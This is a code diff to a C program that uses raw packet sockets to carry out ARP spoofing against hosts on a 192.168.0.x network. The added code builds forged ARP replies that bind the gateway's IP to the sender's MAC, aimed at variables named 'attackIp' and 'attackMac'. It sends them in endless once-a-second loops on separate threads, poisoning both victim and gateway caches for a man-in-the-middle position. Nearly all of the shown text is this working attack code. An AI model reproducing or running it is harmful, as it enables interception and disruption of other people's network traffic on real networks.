@@ -33,11 +33,15 @@
 int sock;	
 struct sockaddr_ll sa;
 struct ifreq req;
-const uint8_t myMac[6]      = {0xc0,0xf8,0xda,0x5c,0xc0,0xfd};
+const uint8_t myMac[6]      = {0x18,0x03,0x73,0x54,0xd8,0x0a};
+const uint8_t attackMac[6]  = {0xac,0x72,0x89,0x3b,0x53,0x49};
+//const uint8_t myMac[6]      = {0xc0,0xf8,0xda,0x5c,0xc0,0xfd};
 const uint8_t gatewayMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-const uint8_t attackIp[4]   = {192,168,0,195};
-const uint8_t myIp[4]       = {192,168,0,187};
+const uint8_t mac[6]        = {0x00,0x21,0x27,0x6a,0x27,0x24};
+const uint8_t attackIp[4]   = {192,168,0,128};
+const uint8_t myIp[4]       = {192,168,0,137};
 const uint8_t gatewayIp[4]  = {192,168,0,1};
+bool flag[256];
 void showMac(uint8_t *s, uint8_t *d)
 {
 	if(s == NULL || d == NULL)
@@ -74,7 +78,46 @@ bool checkMyMac(uint8_t *s)
 	}
 	return flag;
 }
-void sendArp(ARPPACKET	*oarp)
+void *send(void *arg)
+{
+	if(arg != NULL)
+	{
+		ARPPACKET arp;
+		memcpy(&arp, arg, sizeof(arp));
+		int i = 0;
+		while(1)
+		{
+			printf("第 %d 次发送应答包\n", ++i);
+			sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa));
+			sleep(1);
+		}
+	}
+}
+void sendchy()
+{
+	ARPPACKET arp;
+	arp.ethhdr.type = htons(ETH_P_ARP);
+	arp.arphdr.ht =  htons(ARPHRD_ETHER);
+	arp.arphdr.pt =  htons(ETH_P_IP);
+    memcpy(arp.ethhdr.dst, attackMac, 6);
+    memcpy(arp.ethhdr.src, myMac, 6);
+	//memcpy(arp.ethhdr.dst, gatewayMac, 6);
+	arp.arphdr.hl = 6;
+	arp.arphdr.pl = 4;
+	arp.arphdr.op = htons(ARPOP_REPLY);
+	memcpy(arp.arphdr.s_eth, myMac, 6);
+	memcpy(arp.arphdr.t_eth, attackMac, 6);
+	memcpy(arp.arphdr.s_ip, gatewayIp, 4);
+	memcpy(arp.arphdr.t_ip, attackIp, 4);
+	int i = 0;
+	while(1)
+	{
+		printf("第 %d 次发送应答包 --> 192.168.0.%d\n", ++i, attackIp[3]);
+		sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa));
+		sleep(1);
+	}
+}
+void sendArp(ARPPACKET	*oarp,const uint8_t *s,const uint8_t *t)
 {
 	ARPPACKET arp;
 	memcpy(&arp, oarp, sizeof(arp));
@@ -86,16 +129,21 @@ void sendArp(ARPPACKET	*oarp)
 //	memcpy((void*)arp.ethhdr.dst, (void*)gatewayMac, 6);
 //	arp.arphdr.hl = 6;
 //	arp.arphdr.pl = 4;
-//	arp.arphdr.op = htons(ARPOP_REQUEST);
+	arp.arphdr.op = htons(ARPOP_REPLY);
 	memcpy(arp.arphdr.s_eth, myMac, 6);
 	memcpy(arp.arphdr.t_eth, oarp->arphdr.s_eth, 6);
-	memcpy(arp.arphdr.s_ip, gatewayIp, 4);
-	memcpy(arp.arphdr.t_ip, attackIp, 4);
-	if(sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0)
+	memcpy(arp.arphdr.s_ip, s, 4);
+	memcpy(arp.arphdr.t_ip, t, 4);
+	pthread_t pt;
+	if(!pthread_create(&pt, NULL, send,(void *)&arp))
 	{
-		perror("sendto");
-		exit(1);
+		perror("pthread_create");
 	}
+	//if(sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0)
+	//{
+	//	perror("sendto");
+	//	exit(1);
+	//}
 }
 void sendReqArp(ARPPACKET *oarp)
 {
@@ -110,7 +158,6 @@ void sendReqArp(ARPPACKET *oarp)
 	if(sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0)
 	{
 		perror("sendto");
-		exit(1);
 	}
 }
 void recvArp()
@@ -130,14 +177,22 @@ void recvArp()
 		showMac(arp->arphdr.s_eth, arp->arphdr.t_eth);
 		showIp(arp->arphdr.s_ip, arp->arphdr.t_ip);
 		int op = ntohs(arp->arphdr.op);
-		if(op == 2 && arp->arphdr.s_ip[3] == attackIp[3] && arp->arphdr.t_ip[3] == myIp[3])
+		printf("%s\n", op == 1 ? "arp request" : "arp reply");
+		if(op == 2 && arp->arphdr.s_ip[3] == attackIp[3] && arp->arphdr.t_ip[3] == myIp[3] && flag[arp->arphdr.s_ip[3]] == 0)
 		{
+			flag[arp->arphdr.s_ip[3]] = 1;
 			printf("ARP REPLY\n");
-			sendArp(arp);
+			sendArp(arp, gatewayIp, attackIp);
+		}
+		else if(op == 1 && arp->arphdr.s_ip[3] == gatewayIp[3] && arp->arphdr.t_ip[3] == attackIp[3] && flag[arp->arphdr.s_ip[3]] == 0)
+		{
+			flag[arp->arphdr.s_ip[3]] = 1;
+			printf("ARP REPLY\n");
+			sendArp(arp, attackIp, gatewayIp);
 		}
 		else if((op == 1 && arp->arphdr.s_ip[3] == gatewayIp[3]) || (op == 1 && arp->arphdr.s_ip[3] == attackIp[3] && arp->arphdr.t_ip[3] == gatewayIp[3]))
 		{
-			printf("ARP REQEST\n");
+			printf("ARP REQUEST\n");
 			sendReqArp(arp);
 		}
 		printf("--------------------------------\n");
@@ -152,8 +207,9 @@ int main()
 		exit(1);
 	}
 	memset(&sa, 0, sizeof(sa));
+	memset(flag, 0, sizeof(flag));
 	sa.sll_family = AF_PACKET;
-	strcpy(req.ifr_name, "eth1");
+	strcpy(req.ifr_name, "eth0");
 	if(ioctl(sock, SIOCGIFINDEX, &req) != 0)
 	{
 		perror("ioctl");
@@ -175,6 +231,7 @@ int main()
 		exit(1);
 	}
 	recvArp();
+	//sendchy();
 	close(sock);
 	return 1;
 }
